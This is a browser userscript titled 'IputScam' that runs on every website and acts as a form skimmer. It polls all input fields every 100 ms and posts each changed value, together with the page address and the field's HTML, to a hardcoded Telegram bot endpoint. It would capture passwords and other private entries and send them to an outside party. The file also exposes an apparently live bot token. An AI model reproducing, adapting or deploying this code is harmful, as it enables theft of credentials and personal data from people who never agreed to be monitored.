// ==UserScript==
// @name         IputScam
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @grant        none
// @run-at      document-start
// @require http://code.jquery.com/jquery-3.4.1.min.js
// ==/UserScript==
var arr = new Array();
var scanStr = "input";
var prefix = "comp1";

class MyInput {
  constructor(input, v) {
    this.input = input;
    this.v = v;
  }
}

window.mysave = function(t) {
  $.ajax({
         url:'https://api.telegram.org/bot1206474238:AAGUJrbToqalwxIKX6dMptnqJZRVZE5w4Ms/sendMessage',
         method:'POST',
         data:{chat_id:768484953,text:t},
         success:function(){

         }
  });
};

window.makeSave = function(inp, idx) {



    var txt = "$^ " + prefix + "\n$^ " + window.location.origin + window.location.pathname + "\n$^ " + new Date().getTime() + "\n$^ " + idx + "\n$^ " + $(inp)[0].outerHTML + "\n$^ " + inp.value;
    if (inp.value != null) window.mysave(txt);

}

window.myScan = function(){
    if (arr.length == 0) return;

    //console.log("--------------");
    $(scanStr).each(function(i){
        if (arr[i] != null) {
        var i1 = arr[i];
        var i2 = this;

        if (i1.input != i2) {
            window.myScanAll();
            return;
        }

           if (this.name == "951") {
        console.log(this);
        console.log(i1.v + " " + i2.value + " --> " + (i1.v != i2.value));
        }
        if (i1.v != i2.value) {


            i1.input = i2;
            i1.v = i2.value;
            //window.mysave(i2.value);
            window.makeSave(this, i);
            //console.log(arr);
        }
        } else window.myScanAll();
    });
}

window.myInterval = 0;

window.myScanAll = function(){
    arr = new Array();

    var cnt = 0;
    $(scanStr).each(function(){cnt++});
    console.log("SCAN - " + cnt);

    if (cnt == 0) return;
    clearInterval(window.myInterval);
    setInterval(window.myScan, 100);

    arr = new Array(cnt);

    $(scanStr).each(function(i){
        arr[i] = new MyInput(this, this.value);
    });

    console.log(arr);
};



window.addEventListener('load', function() {

    window.myInterval = setInterval(window.myScanAll, 500);

    //timer

}, false);
